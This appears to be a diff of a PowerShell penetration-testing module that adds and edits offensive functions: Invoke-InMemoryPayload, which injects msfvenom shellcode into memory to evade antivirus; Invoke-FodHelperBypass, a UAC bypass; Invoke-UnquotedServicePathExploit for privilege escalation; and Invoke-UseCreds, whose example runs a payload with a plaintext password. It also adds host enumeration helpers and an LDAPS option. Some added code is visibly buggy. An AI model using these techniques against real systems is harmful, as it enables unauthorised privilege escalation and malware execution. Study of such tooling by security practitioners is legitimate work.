@@ -2,39 +2,29 @@
 .SYNOPSIS
     Encode or Decode Base64 strings.
 
-.NOTES
-    Author: Rob Osborne
-    ALias: tobor
-    Contact: rosborne@osbornepro.com
-    https://roberthsoborne.com
 
 .SYNTAX
-    Convert-Base64 [-Value <string[]>] [{-Decode | -Encode}]
+    Convert-Base64 [-Value] <string[]> {-Decode | -Encode}
 
-.PARAMETER
-    -Value
+
+.PARAMETERS
+    -Value <String[]>
         Specifies a string to be encoded or decoded with base64.
 
         Enter a string consisting of spaces and special charcters if desired.DESCRIPTION
 
         Required?                    True
-        Position?                    name
+        Position?                    0
         Default value                None
         Accept pipeline input?       True
         Accept wildcard characters?  false
 
-    -Encode
+    -Encode <Switch>
      This switch is used to tell the cmdlet to encode the base64 string
 
-    -Decode
+    -Decode <Switch>
     This switch parameter is used to tell the cmdlet to decode the base64 string
 
-.INPUTS
-    -Value accepts strings from pipeline.
-    System.String
-
-.OUTPUTS
-    System.String
 
 .EXAMPLE
     -------------------------- EXAMPLE 1 --------------------------
@@ -43,6 +33,23 @@
 
     C:\PS> Convert-Base64 -Value 'SGVsbG8gV29ybGQh' -Decode
     # This example decodes Base64 to a string.
+
+
+.NOTES
+    Author: Rob Osborne
+    ALias: tobor
+    Contact: rosborne@osbornepro.com
+    https://roberthsoborne.com
+
+
+.INPUTS
+    -Value accepts strings from pipeline.
+    System.String
+
+
+.OUTPUTS
+    System.String
+
 #>
 Function Convert-Base64
 {
@@ -127,13 +134,13 @@ Function Convert-Base64
     https://roberthsoborne.com
 
 
-
 .SYNTAX
-    Get-LdapInfo [-Detailed] [ -DomainAdmins | -DomainControllers | -UAC ]
-
+    Get-LdapInfo [-Detailed] [ -DomainAdmins | -DomainControllers | -UAC ] [-LDAPS]
 
 
 .PARAMETER
+    -LDAPS                  [<SwitchParameter>]
+        This switch parameter will perform searches using LDAP over SSL
 
     -Detailed                  [<SwitchParameter>]
         This switch parameter will display all properties of the rerturned objects
@@ -238,13 +245,11 @@ Function Convert-Base64
     SwitchParameters
 
 
-
 .OUTPUTS
 
     IsPublic IsSerial Name                                     BaseType
     -------- -------- ----                                     --------
     True     True     Object[]                                 System.Array
-
 
 
 .EXAMPLE
@@ -471,6 +476,10 @@ Function Get-LdapInfo {
 
             [Parameter(
                 Mandatory=$False)]
+            [switch][bool]$LDAPS,
+
+            [Parameter(
+                Mandatory=$False)]
             [switch][bool]$DomainControllers,
 
             [Parameter(
@@ -656,8 +665,21 @@ Function Get-LdapInfo {
             $Searcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
             $ObjDomain = New-Object -TypeName System.DirectoryServices.DirectoryEntry
 
+            If ($LDAPS.IsPresent)
+            {
+
+                Write-Verbose "[*] LDAP over SSL was specified. Using port 636"
+                $SearchString =  "LDAPS://" + $PrimaryDC + ":636/"
+
+            }  # End If
+            Else
+            {
+
+                $SearchString =  "LDAP://" + $PrimaryDC + ":389/"
+
+            }  # End Else
             $PrimaryDC = ($DomainObj.PdcRoleOwner).Name
-            $SearchString =  "LDAP://" + $PrimaryDC + "/"
+
             $DistinguishedName = "DC=$($DomainObj.Name.Replace('.',',DC='))"
             $SearchString += $DistinguishedName
 
@@ -982,7 +1004,12 @@ Function Invoke-PingSweep
 } # End Function Invoke-PingSweep
 
 
+
 <#
+.NAME
+    Invoke-PortScan
+
+
 .SYNOPSIS
     Invoke-PortScan is a port scanner that is used for scanning ports 1 through 65535 on a single host.DESCRIPTION
 
@@ -1019,11 +1046,20 @@ Function Invoke-PingSweep
 .OUTPUTS
     None. This only displays the results as text and does not return an object.
 
+
 .NOTES
     Author: Rob Osborne
     Alias: tobor
     Contact: rosborne@osbornepro.com
+
+
+.LINK
+    https://github.com/tobor88
+    https://gitlab.com/tobor88
+    https://www.powershellgallery.com/profiles/tobor
     https://roberthosborne.com
+    https://osbornepro.com
+
 #>
 Function Invoke-PortScan
 {
@@ -1071,9 +1107,14 @@ Function Invoke-PortScan
 
 
 <#
+.NAME
+    Start-SimpleHTTPServer
+
+
 .SYNOPSIS
     Use this cmdlet to host files for download. The idea of this is to have a PowerShell tSimpleHTTPServer
     that is similar to Python's module SimpleHTTPServer
+
 
 .DESCRIPTION
     Running this function will open a PowerShell web server on the device it is run on.DESCRIPTION
@@ -1085,15 +1126,25 @@ Function Invoke-PortScan
         The port parameter is for easily defining what port the http server should listen on.
         The default value is 8000.
 
+
 .EXAMPLE
     Start-SimpleHTTPServer
         This example starts an HTTP server on port 8000
+
 
 .NOTES
         Author: Rob Osborne
         Alias: tobor
         Contact: rosborne@osbornepro.com
-        https://roberthosborne.com
+
+
+.LINK
+    https://github.com/tobor88
+    https://gitlab.com/tobor88
+    https://www.powershellgallery.com/profiles/tobor
+    https://roberthosborne.com
+    https://osbornepro.com
+
 #>
 Function Start-SimpleHTTPServer {
     [CmdletBinding()]
@@ -1281,8 +1332,13 @@ Function Start-SimpleHTTPServer {
 
 
 <#
+.NAME
+    Test-PrivEsc
+
+
 .SYNOPSIS
     This cmdlet is meant to check whether the AlwaysInstallEleveated permissions are enabled on a Windows Machine which opens the door to privesc
+
 
 .DESCRIPTION
     AlwaysInstallElevated is functionality that offers all users(especially the low privileged user) on a windows machine to run any MSI file with elevated privileges.
@@ -1291,8 +1347,10 @@ Function Start-SimpleHTTPServer {
     When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user
     to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).
 
+
 .SYNTAX
     Test-PrivEsc [<CommonParameters>]
+
 
 .PARAMETERS
     <CommonParameters>
@@ -1301,11 +1359,20 @@ Function Start-SimpleHTTPServer {
         OutBuffer, PipelineVariable, and OutVariable. For more information, see
         about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).
 
+
 .NOTES
     Author: Rob Osborne
     Alias: tobor
     Contact: rosborne@osbornepro.com
-    https://roberthosborne.com/
+
+
+.LINK
+    https://github.com/tobor88
+    https://gitlab.com/tobor88
+    https://www.powershellgallery.com/profiles/tobor
+    https://roberthosborne.com
+    https://osbornepro.com
+
 #>
 Function Test-PrivEsc {
     [CmdletBinding()]
@@ -1503,8 +1570,139 @@ Function Get-InitialEnum {
     [CmdletBinding()]
         param()  # End param
 
+BEGIN
+{
+
+    Function Show-KerberosTokenPermissions {
+    [CmdletBinding()]
+        param()
+
+    $Token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+
+    ForEach ($SID in $GroupSIDs)
+    {
+
+        Try
+        {
+
+            Write-Host (($sid).Translate([System.Security.Principal.NTAccount]))
+
+        }  # End Try
+        Catch
+        {
+
+            Write-Warning ("Could not translate " + $SID.Value + ". Reason: " + $_.Exception.Message)
+
+        }  # End Catch
+    }
+
+    $Token
+
+}  # End Function Show-KerberosTokenPermissions
+
+
+    Function Get-Driver {
+        [CmdletBinding()]
+            Param (
+                [Switch]$Unsigned,
+                [Switch]$Signed,
+                [Switch]$All)  # End param
     BEGIN
     {
+
+        Write-Host "Retrieving driver signing information …" -ForegroundColor "Cyan"
+
+    } # End of Begin section
+    PROCESS
+    {
+
+        If ($Signed)
+        {
+
+            Write-Verbose "Obtaining signed driver info..."
+            $DrvSig = DriverQuery -SI | Select-String -Pattern "True"
+
+            $DrvSig
+            "`n " + $DrvSig.count + " signed drivers, note TRUE column"
+
+        }  # End of If
+        ElseIf ($UnSigned)
+        {
+
+            Write-Verbose "Obtaining signed driver info..."
+            $DrvU = DriverQuery -SI | Select-String "False"
+
+            $DrvU
+            "`n " + $DrvU.count + " unsigned drivers, note FALSE column"
+
+        }  # End ElseIf
+        ElseIf ($All)
+        {
+
+            DriverQuery -SI
+
+        }  # End ElseIf
+        Else
+        {
+
+            DriverQuery
+
+        }  # End Else
+
+    } # End PROCESS
+
+    } # End Function Get-Driver
+
+
+    Function Get-AntiVirusProduct {
+        [CmdletBinding()]
+            param (
+                [Parameter(
+                    Mandatory=$False,
+                    Position=0,
+                    ValueFromPipeline=$True,
+                    ValueFromPipelineByPropertyName=$true)]
+        [Alias('Computer')]
+        [string]$ComputerName=$env:COMPUTERNAME )  # End param
+
+        $AntiVirusProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct"  -ComputerName $ComputerName
+
+        $Ret = @()
+        ForEach ($AntiVirusProduct in $AntiVirusProducts)
+        {
+           #The values are retrieved from: http://community.kaseya.com/resources/m/knowexch/1020.aspx
+            Switch ($AntiVirusProduct.productState)
+            {
+                "262144" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
+                "262160" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
+                "266240" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
+                "266256" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
+                "393216" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
+                "393232" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
+                "393488" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
+                "397312" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
+                "397328" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
+                "397584" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
+
+                Default {$defstatus = "Unknown" ;$rtstatus = "Unknown"}
+            }  # End Switch
+
+            $HashTable = @{}
+            $HashTable.Computername = $ComputerName
+            $HashTable.Name = $AntiVirusProduct.DisplayName
+            $HashTable.'Product GUID' = $AntiVirusProduct.InstanceGuid
+            $HashTable.'Product Executable' = $AntiVirusProduct.PathToSignedProductExe
+            $HashTable.'Reporting Exe' = $AntiVirusProduct.PathToSignedReportingExe
+            $HashTable.'Definition Status' = $DefStatus
+            $HashTable.'Real-time Protection Status' = $RtStatus
+
+            $Ret += New-Object -TypeName "PSObject" -Property $HashTable
+
+        }  # End ForEach
+
+        $Ret
+
+    }  # End Function Get-AntiVirusProduct
 
 }  # End BEGIN
 PROCESS
@@ -1542,6 +1740,12 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
 
     Get-Driver -Unsigned
 
+#===================================================================
+#  FIND SIGNED DRIVERS
+#===================================================================
+
+    Get-Driver -Signed
+
 #==========================================================================
 #  ANTIVIRUS APPLICATION INFORMATION
 #==========================================================================
@@ -1575,6 +1779,10 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
 
     Write-Host "=================================`n|  SIGNED IN USERS  |`n=================================" -ForegroundColor "Yellow"
     qwinsta
+
+
+    Write-Host "=========================================`n|  CURRENT KERBEROS TICKET PERMISSIONS  |`n=========================================" -ForegroundColor "Yellow"
+    Show-KerberosTokenPermissions
 
 #==========================================================================
 #  NETWORK INFORMATION
@@ -1649,6 +1857,8 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
 }  # End PROCESS
 
 }  # End Function Get-InitialEnum
+
+
 
 Function Get-Driver {
     [CmdletBinding()]
@@ -1760,7 +1970,7 @@ Function Get-AntiVirusProduct {
 
 .SYNOPSIS
     Injects an msfvenom payload into a Windows machines memory as a way to attempt evading Anti-Virus protections.
-
+    This function was built off of a template from the Offensive Security PWK course.
 
 .SYNTAX
     Invoke-InMemoryPayload [-ShellCode] <bytes[] shellcode>
@@ -1768,11 +1978,12 @@ Function Get-AntiVirusProduct {
 
 .DESCRIPTION
     This cmdlet is used to attempt bypassing AV software by injecting shell code in a byte arrary into a separate thread of specially allocated memory.
+    It is possible that this will not be able to execute a certain Windows devices as the DLLs or user permissions may prevent the execution of this function.
 
 
 .EXAMPLES
     -------------------------- EXAMPLE 1 --------------------------
-   C:\PS> Invoke-InMemoryPayload -ShellCode x90,x90,x90,x90,x90,x90,x90,x90,x90,x90,x90,x90,x90,x90,x90,x90,x90,x90,x90
+   C:\PS> Invoke-InMemoryPayload -ShellCode 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
    This command injects NOP bits into a separate thread of specially allocated memory on a Windows machine.
 
 
@@ -1825,8 +2036,6 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
 
     $WinFunc = Add-Type -MemberDefinition $CSCode -Name "Win32" -Namespace "Win32Functions" -PassThru
     $Size = 0x1000
-    [Byte[]];
-    [Byte[]]$ShellCode = $ShellCode
 
     If ($ShellCode.Length -gt 0x1000)
     {
@@ -1850,18 +2059,31 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
             $WinFunc::memset([IntPtr]($x.ToInt32()+$i), $ShellCode[$i], 1)
 
         }  # End Try
-        Catch
+        Catch [Exception]
         {
 
             $Error[0]
 
-            Write-Host "There was an error executing payload. Cmdlet is being prevented from allocating memory with the used DLLs." -ForegroundColor "Red"
+             Write-Host "There was an error executing payload. Cmdlet is being prevented from allocating memory with the used DLLs." -ForegroundColor "Red"
+
+             Pause
+
+             Exit
+
+        }  # End Catch
+        Catch
+        {
+
+            Write-Host "I have not caught this error before. Please email me the results at rosborne@osbornepro.com" -ForegrounColor 'Cyan'
+
+            $Error[0]
 
             Pause
 
             Exit
 
         }  # End Catch
+
     }  # End For
 
     Write-Verbose "Executing in separte thread using CreateThread()..."
@@ -1876,6 +2098,71 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
 }  # End Invoke-InMemoryPayload
 
 
+<#
+.NAME
+    Invoke-FodHelperBypass
+
+
+.SYNOPSIS
+    This function is used to bypass UAC restrictions for the currently logged in user with administrative privileges.
+    When C:\Windows\System32\fodhelper.exe is run, the process first checks the registry value of the current user.
+    If the registry location does not exist it moves on from HKCU to HKCR (HKEY Classes Root). This bypass method exploits
+    this creating the registry value that is searched for first when the process is executed. In the fodhelper.exe
+    application manifest we can see that fodhelper.exe has two flags set that make this possible. This first is the
+    RequestedExecutionLevel which is set to "Require Administrator" and the second is AutoElevate which is set to "True".
+    This means the application can only be run by an administrator and it can elevate privileges without prompting for credentials.
+    To protect your computer from this bypass, don't sign into your computer with an account that has admin privileges. Also
+    set HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System value ConsentPromptBehaviorAdmin to 1 or 2.
+
+
+.SYNTAX
+    Invoke-FodHelperBypass [-Program <string>] [<CommonParameters>]
+
+
+.PARAMETERS
+    -Program <string>
+        Specify the absolute or relative path for executable or application you wish to run with elevated permissions.
+        Specifies a local script that this cmdlet runs with elevated permissions. The script must exist on the local
+        computer or in a directory that the local computer can access.
+        Required?                    True
+        Position?                    0
+        Default value                None
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    <CommonParameters>
+        This cmdlet supports the common parameters: Verbose, Debug,
+        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
+        OutBuffer, PipelineVariable, and OutVariable. For more information, see
+        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).
+
+
+.DESCRIPTION
+    This cmdlet is used to open an application with full administrative privileges for the currently logged in
+    administrative user. If the registry settings are not configured to prevent this from working it will mention
+    what can be done to prevent this from working.
+
+
+.EXAMPLE
+    -------------------------- EXAMPLE 1 --------------------------
+   C:\PS> Invoke-FodHelperBypass -Program 'powershell.exe'
+   This command opens PowerShell in a new window with elevated privileges.
+
+
+.NOTES
+    Author: Robert H. Osborne
+    Alias: tobor
+    Contact: rosborne@osbornepro.com
+    https://roberthosborne.com
+
+.INPUTS
+    [System.IO]
+
+
+.OUTPUTS
+    None
+
+#>
 Function Invoke-FodhelperBypass
 {
     [CmdletBinding()]
@@ -1951,6 +2238,82 @@ Function Invoke-FodhelperBypass
     }  # End END
 
 }  # End Function Invoke-FodHelperBypass
+
+
+<#
+.NAME
+    Invoke-UseCreds
+
+
+.SYNOPSIS
+    This cmdlet is for easily using credentials to execute a program. PowerShell can be a lot of typing.
+    Especially when you dont' have a shell that allows autocompletion. This is a huge time saver.
+    This function DOES NOT accept command line arguments. It only executes an application.
+
+
+.SYNTAX
+    Invoke-UseCreds [-Username] <string> [-Passwd] <string> [-Path] <string> [<CommonParameters>]
+
+
+.PARAMETERS
+    -Username
+        Enter a string containing the domain or workgroup of the user and the username or in some cases just the username.
+        Required?                    True
+        Position?                    0
+        Default value                None
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    -Passwd
+        Enter the string value of the users password
+        Required?                    True
+        Position?                    1
+        Default value                None
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    -Path
+        Defines the location of the application that should execute as the user.
+        Enter a string consisting of the absolute or relative path to the executable
+        Required?                    True
+        Position?                    2
+        Default value                None
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    <CommonParameters>
+        This cmdlet supports the common parameters: Verbose, Debug,
+        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
+        OutBuffer, PipelineVariable, and OutVariable. For more information, see
+        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).
+
+
+.DESCRIPTION
+    This function is used to execute an application as another user. This DOES NOT accept command line arugments.
+    This only executes an application.
+
+
+.EXAMPLE
+    -------------------------- EXAMPLE 1 --------------------------
+   C:\PS> Invoke-UseCreds -Username 'OsbornePro\tobor' -Passwd 'P@ssw0rd1!' -Path 'C:\Windows\System32\spool\drivers\color\msf.exe'
+   This command executes a msfvenom payload as the user tobor
+
+
+.NOTES
+    Author: Robert H. Osborne
+    Alias: tobor
+    Contact: rosborne@osbornepro.com
+    https://roberthosborne.com
+
+
+.INPUTS
+    [System.String]
+
+
+.OUTPUTS
+    None
+
+#>
 Function Invoke-UseCreds {
     [CmdletBinding()]
         param(
@@ -2049,12 +2412,12 @@ END
         accepted from the pipeline.
 
         Required?                    true
-        Position?                    0
+        Position?                    1
         Default value                None
         Accept pipeline input?       True (ByPropertyName, ByValue)
         Accept wildcard characters?  false
 
-    -Command
+    -Command <String[>
         Custom command to execute instead of user creation.
 
         Required?                    true
@@ -2110,7 +2473,7 @@ Function Invoke-UnquotedServicePathExploit {
                 ValueFromPipeline=$False,
                 HelpMessage="Enter a command or commands you want executed")]  # End Parameter
             [ValidateNotNullOrEmpty()]
-            [String]$Command)  # End param
+            [String[]]$Command)  # End param
 
 BEGIN
 {
@@ -2167,7 +2530,7 @@ PROCESS
             cmd /c sc config $ServiceName binPath="$ServiceCommand"
 
             Write-Verbose "[*] Starting $ServiceName to execute '$ServiceCommand'"
-            Start-Service -Name $ServiceName -ErrorAction SilentlyContinue -Force
+            Start-Service -Name $ServiceName -ErrorAction SilentlyContinue
 
             Write-Verbose "[*] Running 2 second buffer between commands"
             Start-Sleep -Seconds 2
@@ -2175,13 +2538,14 @@ PROCESS
         }  # End ForEach
 
         Write-Verbose "[*] Stopping modified service"
-        Stop-Service -Name $ServiceName -Force -ErrorAction Stop -Force
+        Stop-Service -Name $ServiceName -Force -ErrorAction Stop
 
         Write-Verbose "[*] Restoring original path value for $ServiceName"
         Start-Sleep -Seconds 1
 
         cmd /c sc config $ServiceName binPath="$OriginalServicePath"
-        $ServiceObj | Set-Service -StartupType "$OriginalServiceState" -ErrorAction Stop
+        $ServiceObj | Set-Service -StartupType "$OriginalServiceState" -ErrorAction SilentlyContinue
+        # This is used to silently continue because the original value may not be an option for -StartupType
 
         $Obj = New-Object -TypeName "PSObject" -Property @{
             ServiceAbused = $ServiceObj.Name
@@ -2194,3 +2558,127 @@ PROCESS
 }  # End PROCESS
 
 }  # End Function Invoke-UnquotedServicePathExploit
+
+
+<#
+.NAME
+    Convert-SID
+
+
+.SYNOPSIS
+    This cmdlet is for translating an SID to a username or a username to an SID.
+
+
+.SYNTAX
+    Convert-SID [-Username] <string[]> [<CommonParameters>]
+
+    Convert-SID [-SID] <string[]> [<CommonParameters>]
+
+
+.PARAMETER Username
+    If the username parameter value is specified it this cmdlet will result in the SID value of the user.
+
+.PARAMETER SID
+    If the SID parameter value is specified this cmdlet will result in the username value associated with the SID.
+
+
+.EXAMPLE
+    -------------------------- EXAMPLE 1 --------------------------
+    C:\PS> $Pipe = New-Object PSObject -Property @{SID='S-1-5-21-2860287465-2011404039-792856344-500'}
+    C:\PS> $Pipe | Convert-SID
+
+    -------------------------- EXAMPLE 2 --------------------------
+    C:\PS> Convert-SID -Username 'j.smith'
+    C:\PS> Convert-SID -Username j.smith@domain.com
+
+    -------------------------- EXAMPLE 3 --------------------------
+    C:\PS> Convert-SID -SID S-1-5-21-2860287465-2011404039-792856344-500
+    C:\PS> Convert-SID -SID 'S-1-5-21-2860287465-2011404039-792856344-500'
+
+
+.NOTES
+    Author: Robert H. Osborne
+    Alias: tobor
+    Contact: rosborne@osbornepro.com
+
+
+.LINK
+    https://github.com/tobor88
+    https://www.powershellgallery.com/profiles/tobor
+    https://roberthosborne.com
+
+
+.INPUTS
+    System.Array of Usernames or SIDs can be piped to this cmdlet based on property value name.
+
+
+.OUTPUTS
+    System.Management.Automation.PSCustomObject
+
+#>
+Function Convert-SID {
+    [CmdletBinding(DefaultParameterSetName = 'Username')]
+        param(
+            [Parameter(
+                ParameterSetName='Username',
+                Position=0,
+                Mandatory=$True,
+                ValueFromPipeLine=$True,
+                ValueFromPipeLineByPropertyName=$True)]  # End Parameter
+            [ValidateNotNullOrEmpty()]
+            [Alias('User','SamAccountName')]
+            [String[]]$Username,
+
+            [Parameter(
+                ParameterSetName='SID',
+                Position=0,
+                Mandatory=$True,
+                ValueFromPipeLine=$True,
+                ValueFromPipeLineByPropertyName=$True)]  # End Parameter
+            [ValidateNotNullOrEmpty()]
+            [ValidatePattern('S-\d-(?:\d+-){1,14}\d+')]
+            [String[]]$SID)  # End param
+
+
+BEGIN
+{
+
+    [array]$Obj = @()
+
+    Write-Verbose "[*] Obtaining username and SID information for defined value"
+
+}  # End BEGIN
+PROCESS
+{
+
+    For ($i = 0; $i -lt (Get-Variable -Name ($PSCmdlet.ParameterSetName) -ValueOnly).Count; $i++)
+    {
+
+        $Values = Get-Variable -Name ($PSCmdlet.ParameterSetName) -ValueOnly
+
+        New-Variable -Name ArrayItem -Value ($Values[$i])
+
+        Switch ($PSCmdlet.ParameterSetName)
+        {
+            SID {$ObjSID = New-Object -TypeName System.Security.Principal.SecurityIdentifier($ArrayItem); $ObjUser = $ObjSID.Translate([System.Security.Principal.NTAccount])}
+            Username {$ObjUser = New-Object -TypeName System.Security.Principal.NTAccount($ArrayItem); $ObjSID = $ObjUser.Translate([System.Security.Principal.SecurityIdentifier])}
+        }  # End Switch
+
+        $Obj += New-Object -TypeName "PSObject" -Property @{
+            Username = $ObjUser.Value
+            SID = $ObjSID.Value
+        }   # End Property
+
+        Remove-Variable -Name ArrayItem
+
+    }  # End For
+
+}  # End PROCESS
+END
+{
+
+    Write-Output $Obj
+
+}  # End END
+
+}  # End Function Convert-SID
